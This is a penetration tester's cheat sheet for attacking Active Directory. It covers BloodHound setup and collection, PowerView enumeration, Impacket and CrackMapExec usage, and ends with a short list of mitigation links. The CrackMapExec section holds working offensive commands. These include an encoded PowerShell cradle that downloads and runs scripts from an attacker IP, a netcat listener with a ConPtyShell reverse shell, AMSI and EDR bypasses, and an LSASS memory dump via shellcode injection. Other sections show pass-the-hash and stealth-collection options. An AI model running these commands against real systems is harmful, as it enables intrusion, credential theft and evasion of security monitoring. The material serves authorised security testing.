# AD

* [https://habr.com/ru/company/pt/blog/423903/](https://habr.com/ru/company/pt/blog/423903/)
* [https://habr.com/ru/company/jetinfosystems/blog/449278/](https://habr.com/ru/company/jetinfosystems/blog/449278/)
* [https://habr.com/ru/company/bastion/blog/598769/](https://habr.com/ru/company/bastion/blog/598769/)
* [https://xakep.ru/2019/10/16/windows-ad-hack/](https://xakep.ru/2019/10/16/windows-ad-hack/)
* [https://hausec.com/2019/03/05/penetration-testing-active-directory-part-i/](https://hausec.com/2019/03/05/penetration-testing-active-directory-part-i/)
* [https://hausec.com/2019/03/12/penetration-testing-active-directory-part-ii/](https://hausec.com/2019/03/12/penetration-testing-active-directory-part-ii/)
* [https://kalitut.com/hacking-windows-active-directory-full/](https://kalitut.com/hacking-windows-active-directory-full/)
* [https://rmusser.net/docs/Active_Directory.html](https://rmusser.net/docs/Active_Directory.html)
* [https://zer1t0.gitlab.io/posts/attacking_ad/](https://zer1t0.gitlab.io/posts/attacking_ad/)
* [https://rootdse.org/posts/active-directory-basics-1/](https://rootdse.org/posts/active-directory-basics-1/)
* [https://rootdse.org/posts/active-directory-basics-2/](https://rootdse.org/posts/active-directory-basics-2/)
* [Атаки на домен / XSS.is](https://xss.is/threads/29895/)
* [Подкасты RedTeam Brazzers / Яндекс.Музыка](https://music.yandex.ru/album/21374924)

{% embed url="https://youtu.be/5VW_eQD1-eA" %}

{% embed url="https://youtu.be/ReHn7c8qlIo" %}

{% embed url="https://www.youtube.com/live/_Yuu4RaMWDY?feature=share" %}

![Pentesting AD Mindmap](https://orange-cyberdefense.github.io/ocd-mindmaps/img/pentest_ad_dark_2022_11.svg)




## Microsoft Wont-Fix-List

* [https://github.com/cfalta/MicrosoftWontFixList/blob/main/README.md](https://github.com/cfalta/MicrosoftWontFixList/blob/main/README.md)




## AD Labs

- [https://github.com/chvancooten/CloudLabsAD](https://github.com/chvancooten/CloudLabsAD)
- [https://github.com/WazeHell/vulnerable-AD](https://github.com/WazeHell/vulnerable-AD)



### Capsulecorp

- [https://livebook.manning.com/book/penetrating-enterprise-networks/](https://livebook.manning.com/book/penetrating-enterprise-networks/)
- [https://github.com/R3dy/capsulecorp-pentest](https://github.com/R3dy/capsulecorp-pentest)
- [https://realhax.gitbook.io/capsulecorp-pentest/setup/windows](https://realhax.gitbook.io/capsulecorp-pentest/setup/windows)



### Game Of Active Directory

- [GOAD - part 1 - reconnaissance and scan](https://mayfly277.github.io/posts/GOADv2-pwning_part1/)
- [GOAD - part 2 - find users](https://mayfly277.github.io/posts/GOADv2-pwning-part2/)
- [GOAD - part 3 - enumeration with user](https://mayfly277.github.io/posts/GOADv2-pwning-part3/)
- [GOAD - part 4 - poison and relay](https://mayfly277.github.io/posts/GOADv2-pwning-part4/)
- [GOAD - part 5 - exploit with user](https://mayfly277.github.io/posts/GOADv2-pwning-part5/)
- [GOAD - part 6 - ADCS](https://mayfly277.github.io/posts/GOADv2-pwning-part6/)
- [GOAD - part 7 - MSSQL](https://mayfly277.github.io/posts/GOADv2-pwning-part7/)
- [GOAD - part 8 - Privilege escalation](https://mayfly277.github.io/posts/GOADv2-pwning-part8/)
- [GOAD - part 9 - Lateral move](https://mayfly277.github.io/posts/GOADv2-pwning-part9/)
- [GOAD - part 10 - Delegations](https://mayfly277.github.io/posts/GOADv2-pwning-part10/)
- [GOAD - part 11 - ACL](https://mayfly277.github.io/posts/GOADv2-pwning-part11/)
- [GOAD - part 12 - Trusts](https://mayfly277.github.io/posts/GOADv2-pwning-part12/)
- [GOAD - part 13 - Having fun inside a domain](https://mayfly277.github.io/posts/GOADv2-pwning-part13/)
- [https://github.com/Orange-Cyberdefense/GOAD](https://github.com/Orange-Cyberdefense/GOAD)




## Bank Security Challenge

- [MSK Department](https://hackmd.io/@BSC/SyCdGCSGi)
- [SPB Department](https://hackmd.io/@BSC/B1uCALDfi)




## The Path to DA

- [https://shorsec.io/blog/the-path-to-da-part-1-sysadmins-love-generic-passwords/](https://shorsec.io/blog/the-path-to-da-part-1-sysadmins-love-generic-passwords/)
- [https://shorsec.io/blog/the-path-to-da-part-2-relaying-to-the-internet-and-back/](https://shorsec.io/blog/the-path-to-da-part-2-relaying-to-the-internet-and-back/)




## Tools



### BloodHound

- [https://github.com/BloodHoundAD/BloodHound](https://github.com/BloodHoundAD/BloodHound)
- [https://blog.compass-security.com/2022/05/bloodhound-inner-workings-part-1/](https://blog.compass-security.com/2022/05/bloodhound-inner-workings-part-1/)
- [https://blog.compass-security.com/2022/05/bloodhound-inner-workings-part-2/](https://blog.compass-security.com/2022/05/bloodhound-inner-workings-part-2/)
- [https://blog.compass-security.com/2022/05/bloodhound-inner-workings-part-3/](https://blog.compass-security.com/2022/05/bloodhound-inner-workings-part-3/)
- [https://habr.com/ru/companies/solarsecurity/articles/681108/](https://habr.com/ru/companies/solarsecurity/articles/681108/)
- [https://habr.com/ru/companies/solarsecurity/articles/707190/](https://habr.com/ru/companies/solarsecurity/articles/707190/)
- [https://habr.com/ru/companies/solarsecurity/articles/719714/](https://habr.com/ru/companies/solarsecurity/articles/719714/)
- [[PDF] BloodHound Unleashed (Esteban Rodriguez, Frank Scarpella)](https://github.com/n00py/CactusCon2023/blob/main/BloodHound%20Unleashed.pdf)


#### Setup

```bash
curl -sSL https://api.github.com/repos/ly4k/BloodHound/releases/latest | jq -r '.assets[].browser_download_url' | grep 'BloodHound-linux-x64.zip' | wget -O 'BloodHound.zip' -i -
unzip BloodHound.zip && rm BloodHound.zip
mv BloodHound-linux-x64 BloodHound && cd BloodHound
sudo chown root:root chrome-sandbox
sudo chmod 4755 chrome-sandbox
chmod +x BloodHound
sudo mkdir /usr/share/neo4j/logs/

mkdir -p ~/.config/bloodhound
curl -sSL https://github.com/ShutdownRepo/Exegol-images/raw/main/sources/bloodhound/customqueries.json > /tmp/customqueries1.json
curl -sSL https://github.com/CompassSecurity/BloodHoundQueries/raw/master/BloodHound_Custom_Queries/customqueries.json > /tmp/customqueries2.json
curl -sSL https://github.com/ZephrFish/Bloodhound-CustomQueries/raw/main/customqueries.json > /tmp/customqueries3.json
curl -sSL https://github.com/ly4k/Certipy/raw/main/customqueries.json > /tmp/customqueries4.json

python3 - << 'EOT'
import json
from pathlib import Path

merged, dups = {'queries': []}, set()
for jf in sorted((Path('/tmp')).glob('customqueries*.json')):
	with open(jf, 'r') as f:
		for query in json.load(f)['queries']:
			if 'queryList' in query.keys():
				qt = tuple(q['query'] for q in query['queryList'])
				if qt not in dups:
					merged['queries'].append(query)
					dups.add(qt)

with open(Path.home() / '.config' / 'bloodhound' / 'customqueries.json', 'w') as f:
	json.dump(merged, f, indent=4)

EOT

rm /tmp/customqueries*.json
curl -sSL "https://github.com/ShutdownRepo/Exegol-images/raw/main/sources/bloodhound/config.json" > ~/.config/bloodhound/config.json
sed -i 's/"password": "exegol4thewin"/"password": "WeaponizeK4li!"/g' ~/.config/bloodhound/config.json
```

```
custom queries, bloodhound-python support???
docker run -itd -p 7687:7687 -p 7474:7474 --env NEO4J_AUTH=neo4j/YOURPASSWORD -v $(pwd)/neo4j:/data neo4j:4.4-community
curl -L https://github.com/SpecterOps/BloodHound/raw/main/examples/docker-compose/docker-compose.yml | docker compose -f - up
https://blog.spookysec.net/Deploying-BHCE/
```


#### Collectors

##### SharpHound.exe

- [https://github.com/BloodHoundAD/SharpHound3](https://github.com/BloodHoundAD/SharpHound3)
- [https://github.com/BloodHoundAD/BloodHound/blob/master/Collectors/SharpHound.exe](https://github.com/BloodHoundAD/BloodHound/blob/master/Collectors/SharpHound.exe)
- [https://bloodhound.readthedocs.io/en/latest/data-collection/sharphound-all-flags.html](https://bloodhound.readthedocs.io/en/latest/data-collection/sharphound-all-flags.html)

![SharpHound cheatsheet (by @SadProcessor)](https://bloodhound.readthedocs.io/en/latest/_images/SharpHoundCheatSheet.png)

```
PS > .\SharpHound.exe [-d megacorp.local] [--LdapUsername snovvcrash] [--LdapPassword 'Passw0rd!'] -c All,GPOLocalGroup [--Stealth] --CollectAllProperties --OutputDirectory C:\Windows\Temp --MemCache --ZipFileName backup_full.zip [--RandomFilenames] [--Throttle 100] [--Jitter 20]
PS > .\SharpHound.exe -c SessionLoop --Loop --LoopInterval 00:01:00 --Loopduration 03:09:41
```

##### RustHound

- [https://github.com/OPENCYBER-FR/RustHound](https://github.com/OPENCYBER-FR/RustHound)

##### SharpHound.ps1

- [https://github.com/BloodHoundAD/BloodHound/blob/master/Collectors/SharpHound.ps1](https://github.com/BloodHoundAD/BloodHound/blob/master/Collectors/SharpHound.ps1)

```
PS > Invoke-Bloodhound [-Domain megacorp.local] [-LdapUsername snovvcrash] [-LdapPassword 'Passw0rd!'] -CollectionMethod All,GPOLocalGroup [-Stealth] -CollectAllProperties -OutputDirectory C:\Windows\Temp -NoSaveCache -RandomizeFilenames -ZipFileName backup_full.zip [-Throttle 100] [-Jitter 20]
PS > Invoke-Bloodhound -CollectionMethod SessionLoop -Loop -LoopInterval 00:01:00 -Loopduration 03:09:41
```

##### BloodHound.py

* [https://github.com/fox-it/BloodHound.py](https://github.com/fox-it/BloodHound.py)

```
$ cd ~/ws/enum/bloodhound/bloodhound.py/
$ bloodhound-python -c All,LoggedOn --zip -u snovvcrash -p 'Passw0rd!' -d megacorp.local -ns 192.168.1.11
$ proxychains4 -q bloodhound-python -c All,LoggedOn --zip -u snovvcrash --hashes aad3b435b51404eeaad3b435b51404ee:fc525c9683e8fe067095ba2ddc971889 -d megacorp.local -ns 192.168.1.11 -dc DC01.megacorp.local -gc DC01.megacorp.local --dns-tcp
```

Import with [bloodhound-import](https://github.com/fox-it/bloodhound-import):

```
$ bloodhound-import -du neo4j -dp 'Passw0rd!' 20190115133114*.json
```

##### ADExplorerSnapshot.py

- [https://github.com/c3c/ADExplorerSnapshot.py](https://github.com/c3c/ADExplorerSnapshot.py)
- [https://docs.microsoft.com/en-us/sysinternals/downloads/adexplorer](https://docs.microsoft.com/en-us/sysinternals/downloads/adexplorer)

##### BOFHound

- [https://www.fortalicesolutions.com/posts/bofhound-granularize-your-active-directory-reconnaissance-game](https://www.fortalicesolutions.com/posts/bofhound-granularize-your-active-directory-reconnaissance-game)
- [https://github.com/fortalice/bofhound](https://github.com/fortalice/bofhound)
- [https://github.com/fortalice/pyldapsearch](https://github.com/fortalice/pyldapsearch)


#### Cypher (Neo4j)

* [https://hausec.com/2019/09/09/bloodhound-cypher-cheatsheet/](https://hausec.com/2019/09/09/bloodhound-cypher-cheatsheet/)
* [https://github.com/mgeeky/Penetration-Testing-Tools/blob/master/red-teaming/bloodhound/Handy-BloodHound-Cypher-Queries.md](https://github.com/mgeeky/Penetration-Testing-Tools/blob/master/red-teaming/bloodhound/Handy-BloodHound-Cypher-Queries.md)
* [https://github.com/ShutdownRepo/Exegol/blob/master/sources/bloodhound/customqueries.json](https://github.com/ShutdownRepo/Exegol/blob/master/sources/bloodhound/customqueries.json)
* [https://github.com/CompassSecurity/BloodHoundQueries/blob/master/customqueries.json](https://github.com/CompassSecurity/BloodHoundQueries/blob/master/customqueries.json)
* [https://github.com/ZephrFish/Bloodhound-CustomQueries/blob/main/customqueries.json](https://github.com/ZephrFish/Bloodhound-CustomQueries/blob/main/customqueries.json)
* [https://github.com/ly4k/Certipy/blob/main/customqueries.json](https://github.com/ly4k/Certipy/blob/main/customqueries.json)

Show percentage of collected user sessions:

{% embed url="https://youtu.be/q86VgM2Tafc?t=353" %}

```
# http://localhost:7474/browser/
MATCH (u1:User)
WITH COUNT(u1) AS totalUsers
MATCH (c:Computer)-[r:HasSession]->(u2:User)
WITH totalUsers, COUNT(DISTINCT(u2)) AS usersWithSessions
RETURN totalUsers, usersWithSessions, 100 * usersWithSessions / totalUsers AS percetange
```

Show path to any computer from kerberoastable users:

```
MATCH (u:User {hasspn:true}), (c:Computer), p=shortestPath((u)-[*1..]->(c)) RETURN p
```


#### Manual JSON Parsing

- [https://blog.bitsadmin.com/blog/dealing-with-large-bloodhound-datasets](https://blog.bitsadmin.com/blog/dealing-with-large-bloodhound-datasets)
- [https://github.com/bitsadmin/chophound](https://github.com/bitsadmin/chophound)
- [https://github.com/knavesec/Max](https://github.com/knavesec/Max)

{% embed url="https://youtu.be/o3W4H0UfDmQ" %}

There're 2 global dicts in JSON files: `data` and `meta`. We care about `data`:

```json
$ cat 20220604031239_users.json | jq '. | keys'
[
  "data",
  "meta"
]
```

List all active user accounts:

```
cat 20220604031239_users.json | jq '.data[].Properties | select(.enabled == true) | .samaccountname' -r
```

List non-empty user accounts' descriptions:

```
cat 20220604031239_users.json | jq '.data[].Properties | select(.enabled == true and .description != null) | .name + " :: " + .description' -r
```

List user accounts whose passwords were set after their last logon (an effective list for password spraying assuming that the passwords were set by IT Desk and may be guessable):

```
cat 20220604031239_users.json | jq '.data[].Properties | select(.enabled == true and .pwdlastset > .lastlogontimestamp) | .name + " :: " + (.lastlogontimestamp | tostring)' -r
```

List user accounts with `DoesNotRequirePreAuth` set (aka [asreproastable](/pentest/infrastructure/ad/kerberos/roasting.md#asreproasting)):

```
cat 20220604031239_users.json | jq '.data[].Properties | select(.enabled == true and .dontreqpreauth == true) | .name' -r
```

List user accounts with SPN(s) set (aka [kerberoastable](/pentest/infrastructure/ad/kerberos/roasting.md#kerberoasting))

```
cat 20220604031239_users.json | jq '.data[].Properties | select(.enabled == true and .serviceprincipalnames != []) | .name + " :: " + (.serviceprincipalnames | join(","))' -r
```

List computer accounts' operating system names:

```
cat 20220604031239_computers.json | jq '.data[].Properties | .name + " :: " + .operatingsystem' -r
```

Recursively list all members of a group (mimics RSAT `Get-ADGroupMember`, [script](https://github.com/snovvcrash/WeaponizeKali.sh/blob/main/py/bh_get_ad_group_member.py)):

```
$ ls
20220604043009_computers.json  20220604043009_groups.json  20220604043009_users.json
$ python3 get_ad_group_member.py 'DOMAIN ADMINS@MEGACORP.LOCAL'
```

Recursively list all groups which the user is a member of (mimics RSAT `Get-ADUser | select memberof`, [script](https://github.com/snovvcrash/WeaponizeKali.sh/blob/main/py/bh_get_ad_user_memberof.py)):

```
$ ls
20220604043009_groups.json  20220604043009_users.json
$ python3 get_ad_user_memberof.py 'SNOVVCRASH@MEGACORP.LOCAL'
```

Generate a `.csv` file containing AD trusts mapping to be used in [TrustVisualizer](https://github.com/snovvcrash/TrustVisualizer) (mimics PowerView `Get-DomainTrustMapping`, [script](https://github.com/snovvcrash/WeaponizeKali.sh/blob/main/py/bh_get_domain_trust_mapping.py)):

```
$ ls
20220604043009_domains.json
$ python3 get_domain_trust_mapping.py
```



### PowerView / SharpView

* [https://www.harmj0y.net/blog/powershell/make-powerview-great-again/](https://www.harmj0y.net/blog/powershell/make-powerview-great-again/)
* [https://github.com/HarmJ0y/CheatSheets/blob/master/PowerView.pdf](https://github.com/HarmJ0y/CheatSheets/blob/master/PowerView.pdf)
* [https://gist.github.com/HarmJ0y/184f9822b195c52dd50c379ed3117993](https://gist.github.com/HarmJ0y/184f9822b195c52dd50c379ed3117993)
* [PowerView2.ps1](https://github.com/PowerShellEmpire/PowerTools/blob/master/PowerView/powerview.ps1)
* [PowerView3.ps1](https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1)
* [ZeroDayLab](https://exploit.ph/powerview.html) / [PowerView4.ps1](https://github.com/ZeroDayLab/PowerSploit/blob/master/Recon/PowerView.ps1)
* [0xe7 / PowerView4.ps1](https://github.com/0xe7/PowerSploit/blob/master/Recon/PowerView.ps1)
* [SharpView.exe](https://github.com/tevora-threat/SharpView/blob/master/Compiled/SharpView.exe)


#### Example Queries

##### Users

Convert SID to name and vice versa:

```
PV3 > ConvertTo-SID <NAME>
PV3 > Convert-NameToSid <NAME>
PV3 > ConvertFrom-SID <SID>
PV3 > Convert-SidToName <SID>
```

Extract all domain user accounts into a `.csv` file:

```
PV3 > Get-DomainUser -Domain megacorp.local | select name,samAccountName,description,memberOf,whenCreated,pwdLastSet,lastLogonTimestamp,accountExpires,adminCount,userPrincipalName,servicePrincipalName,mail,userAccountControl | Export-Csv .\all-users.csv -NoTypeInformation
```

List domain user accounts that do not require Kerberos **pre-authentication** (see [ASREPRoasting](/pentest/infrastructure/ad/kerberos/roasting.md#asreproasting)):

```
PS > .\SharpView.exe Get-DomainUser -KerberosPreauthNotRequired -Properties samAccountName,userAccountControl,memberOf
```

List domain user accounts with **Service Principal Names** (SPNs) set (see [Kerberoasting](/pentest/infrastructure/ad/kerberos/roasting.md#kerberoasting)):

```
PS > .\SharpView.exe Get-DomainUser -SPN -Properties samAccountName,memberOf,servicePrincipalName
```

List domain user accounts with Kerberos **unconstrained delegation** enabled:

```
PS > .\SharpView.exe Get-DomainUser -LDAPFilter "(userAccountControl:1.2.840.113556.1.4.803:=524288)"
```

List domain user accounts with Kerberos **constrained delegation** enabled:

```
PS > .\SharpView.exe Get-DomainUser -TrustedToAuth -Properties samAccountName,userAccountControl,memberOf
```

Search for domain user accounts which may have sensitive stored in the `description` field:

```
PV3 > Get-DomainUser -Properties samaccountname,description | Where {$_.description -ne $null}
```

Search for domain user by email:

```
PV3 > Get-DomainUser -LDAPFilter '(mail=snovvcrash@megacorp.com)' -Properties samaccountname
```

Find users with DCSync right:

```
PV3 > $dcsync = Get-DomainObjectACL "DC=megacorp,DC=local" -ResolveGUIDs | ? {$_.ActiveDirectoryRights -match "GenericAll" -or $_.ObjectAceType -match "Replication-Get"} | select -ExpandProperty SecurityIdentifier | select -ExpandProperty value
PV3 > Convert-SidToName $dcsync
```

##### Groups

Enumerate domain computers where specific users (Identity) are members of a specific local group (LocalGroup):

```
PV3 > Get-DomainGPOUserLocalGroupMapping -Identity snovvcrash -LocalGroup Administrators
```

##### Computers

Extract all domain computer accounts into a `.csv` file:

```
PV3 > Get-DomainComputer -Properties dnsHostName,operatingSystem,lastLogonTimestamp,userAccountControl | Export-Csv .\all-computers.csv -NoTypeInformation
```

List domain computer accounts that allow Kerberos **unconstrained delegation**:

```
PS > .\SharpView.exe Get-DomainComputer -Unconstrained -Properties dnsHostName,userAccountControl
```

Resolve all domain computer IPs by their names:

```
PV3 > Get-DomainComputer -Properties name | Resolve-IPAddress
```

List domain computers that are part of a OU:

```
PV3 > Get-DomainComputer | ? { $_.DistinguishedName -match "OU=<OU_NAME>" } | select dnsHostName
```

##### Shares

List shares for `WS01` computer:

```
PS > .\SharpView.exe Get-NetShare -ComputerName WS01
```

##### GPOs

List all domain users with a 4-digit RID (eliminates default objects like 516, 519, etc.) who can edit GPOs:

```
PV3 > Get-DomainGPO | Get-DomainObjectAcl -ResolveGUIDs | ? { $_.ActiveDirectoryRights -match "WriteProperty|WriteDacl|WriteOwner" -and $_.SecurityIdentifier -match "<SID>-[\d]{4,10}" } | select objectDN, activeDirectoryRights, securityIdentifier | fl
```

Resolve GPO ObjectDN:

```
PV3 > Get-DomainGPO -Name "<DN>" -Properties DisplayName
```



### Impacket

* [https://github.com/fortra/impacket](https://github.com/fortra/impacket)
* [https://github.com/ThePorgs/impacket](https://github.com/ThePorgs/impacket)
* [https://github.com/ropnop/impacket_static_binaries](https://github.com/ropnop/impacket_static_binaries)
* [https://github.com/maaaaz/impacket-examples-windows](https://github.com/maaaaz/impacket-examples-windows)
* [https://github.com/icyguider/MoreImpacketExamples](https://github.com/icyguider/MoreImpacketExamples)
* [https://tools.thehacker.recipes/impacket](https://tools.thehacker.recipes/impacket)
* [https://www.synacktiv.com/en/publications/traces-of-windows-remote-command-execution.html](https://www.synacktiv.com/en/publications/traces-of-windows-remote-command-execution.html)
* [https://habr.com/ru/post/703332/](https://habr.com/ru/post/703332/)
* [https://habr.com/ru/companies/pt/articles/745550/](https://habr.com/ru/companies/pt/articles/745550/)

{% file src="/.gitbook/assets/Impacket Exec Commands Cheat Sheet.pdf" %}

Install:

```
$ pipx install -f "git+https://github.com/fortra/impacket.git"
$ pipx install -f "git+https://github.com/ThePorgs/impacket.git"
```



### CrackMapExec

- [https://github.com/Porchetta-Industries/CrackMapExec](https://github.com/Porchetta-Industries/CrackMapExec)

![CrackMapExec Mindmap](https://raw.githubusercontent.com/Ignitetechnologies/Mindmap/main/Crackmapexec/Crackmapexec%20UHD.png)

Install bleeding-edge:

```
$ sudo apt install python3-venv && pip3 install pipx
$ pipx install -f "git+https://github.com/Porchetta-Industries/CrackMapExec.git"
$ cme
```

[aardwolf](https://github.com/skelsec/aardwolf) requires Rust compiler to be also installed:

```
$ sudo snap install rustup --classic
$ rustup toolchain install stable
```

Install for debugging and development:

```
$ git clone --recursive https://github.com/Porchetta-Industries/CrackMapExec ~/tools/CrackMapExec && cd ~/tools/CrackMapExec
$ poetry install
$ poetry run crackmapexec
```

Execute a PowerShell command using base64 encoding on-the-fly:

```
$ cme smb 192.168.1.11 -u snovvcrash -p 'Passw0rd!' -x "powershell -enc `echo -n 'iex(new-object net.webclient).downloadstring("http://10.10.13.37/amsi.ps1");iex(new-object net.webclient).downloadstring("http://10.10.13.37/cradle.ps1")' | iconv -t UTF-16LE | base64 -w0`"
```

Bypass network IPS restrictions:

```
$ sudo nmap -n -sn 192.168.1.0/24 | grep for | awk '{print $5}' > 192.168.1
$ for ip in `cat 192.168.1`; do cme smb $ip; sleep 1; done
Or
$ cme -t 1 --jitter 1 smb 192.168.1.0/24
```


#### Custom Switches

Bypass execution restrictions of EDRs monitoring for `WmiPrvSE.exe` misbehavior with custom switches (see [dotnetassembly](https://github.com/snovvcrash/CrackMapExec/tree/dotnetassembly) branch).

Get the dependencies and stuff:

```
$ sudo apt install mono-devel
$ git clone --single-branch -b syscalls https://github.com/S4ntiagoP/donut ~/tools/donut && cd ~/tools/donut && make && sudo ln -sv `realpath donut` /usr/local/bin/donut && cd -
$ wget https://github.com/snovvcrash/CrackMapExec/raw/dotnetassembly/cme/data/donut_template.cs -O ~/.cme/donut_template.cs
$ wget https://github.com/snovvcrash/CrackMapExec/raw/dotnetassembly/cme/protocols/smb.py -O ~/.local/pipx/venvs/crackmapexec/lib/python3.10/site-packages/cme/protocols/smb.py
```

Example of invoking a PowerShell module ([ConPtyShell](https://github.com/antonioCoco/ConPtyShell)):

```
$ stty raw -echo; (stty size; cat) | nc -lvnp 1337
$ cme smb 192.168.1.11 -u snovvcrash -p 'Passw0rd!' -x 'Invoke-ConPtyShell.ps1 Invoke-ConPtyShell 10.10.13.37 1337' --amsi-bypass amsi.ps1 --no-output
```

Example of executing a .NET assembly ([Rubeus](https://github.com/GhostPack/Rubeus)):

```
$ cme smb 192.168.1.11 -u snovvcrash -p 'Passw0rd!' -x 'Seatbelt.exe -group=user' --dotnetassembly --dotnetassembly-entrypoint 'Rubeus,Program,MainString' --dotnetassembly-entrypoint-argtype string --amsi-bypass amsi.ps1 --codec cp866
```

Example of converting an unmanaged binary ([NanoDump](https://github.com/helpsystems/nanodump)) to a shellcode with [donut](https://github.com/S4ntiagoP/donut/tree/syscalls), then compiling a .NET self-injector from a template with the shellcode inside and executing it (see [SharpBin2SelfInject](https://gist.github.com/snovvcrash/30bd25b1a5a18d8bb7ce3bb8dc2bae37)):

```
$ cme smb 192.168.1.11 -u snovvcrash -p 'Passw0rd!' -x 'nanodump.exe -w C:\Windows\Temp\lsass.bin' --dotnetassembly --donut
```




## Slinky Cat & OffensiveSysAdmin

- [https://labs.lares.com/introducing-slinkycat/](https://labs.lares.com/introducing-slinkycat/)
- [https://github.com/LaresLLC/SlinkyCat](https://github.com/LaresLLC/SlinkyCat)
- [https://github.com/LaresLLC/OffensiveSysAdmin](https://github.com/LaresLLC/OffensiveSysAdmin)




## Mitigations

Common vulnerabilities & misconfigurations and recommendations:

* [https://www.infosecmatter.com/top-16-active-directory-vulnerabilities/#2-admincount-attribute-set-on-common-users](https://www.infosecmatter.com/top-16-active-directory-vulnerabilities/#2-admincount-attribute-set-on-common-users)
* [https://threadreaderapp.com/thread/1369309701050142720.html](https://threadreaderapp.com/thread/1369309701050142720.html)
* [https://s3cur3th1ssh1t.github.io/The-most-common-on-premise-vulnerabilities-and-misconfigurations/](https://s3cur3th1ssh1t.github.io/The-most-common-on-premise-vulnerabilities-and-misconfigurations/)
* [https://github.com/evilmog/ntlmv1-multi/blob/master/resources/checklist.txt](https://github.com/evilmog/ntlmv1-multi/blob/master/resources/checklist.txt)

SMB lateral-movement hardening:

* [https://posts.specterops.io/offensive-lateral-movement-1744ae62b14f](https://posts.specterops.io/offensive-lateral-movement-1744ae62b14f)
* [https://medium.com/palantir/restricting-smb-based-lateral-movement-in-a-windows-environment-ed033b888721](https://medium.com/palantir/restricting-smb-based-lateral-movement-in-a-windows-environment-ed033b888721)

{% file src="/.gitbook/assets/SMB Enumeration-Exploitation-Hardening (Anil BAS).pdf" %}

Antispam protection for Exchange:

{% file src="/.gitbook/assets/Antispam Forefront Protection 2010 (Exchange Server).pdf" %}

Detect stale, unused or fake computer accounts based on password age (replace `-90` with your domain's maximum computer account password age):

```
$date = [DateTime]::Today.AddDays(-90); Get-ADComputer -Filter '(Enabled -eq $true) -and (PasswordLastSet -le $date)' | select Name
```

Administrative Tier Model & Microsoft RaMP (Zero Trust **Ra**pid **M**odernization **P**lan):

* [https://security-tzu.com/2020/03/23/mitigate-credential-theft-with-administrative-tier-model/](https://security-tzu.com/2020/03/23/mitigate-credential-theft-with-administrative-tier-model/)
* [https://www.secframe.com/ramp/](https://www.secframe.com/ramp/)
* [https://posts.specterops.io/establish-security-boundaries-in-your-on-prem-ad-and-azure-environment-dcb44498cfc2](https://posts.specterops.io/establish-security-boundaries-in-your-on-prem-ad-and-azure-environment-dcb44498cfc2)

Post compromise AD actions (checklist):

- [https://www.hub.trimarcsecurity.com/post/securing-active-directory-performing-an-active-directory-security-review](https://www.hub.trimarcsecurity.com/post/securing-active-directory-performing-an-active-directory-security-review)
- [https://www.pwndefend.com/2021/09/15/post-compromise-active-directory-checklist/](https://www.pwndefend.com/2021/09/15/post-compromise-active-directory-checklist/)

Hardening automatization tool:

- [https://github.com/0x6d69636b/windows_hardening](https://github.com/0x6d69636b/windows_hardening)
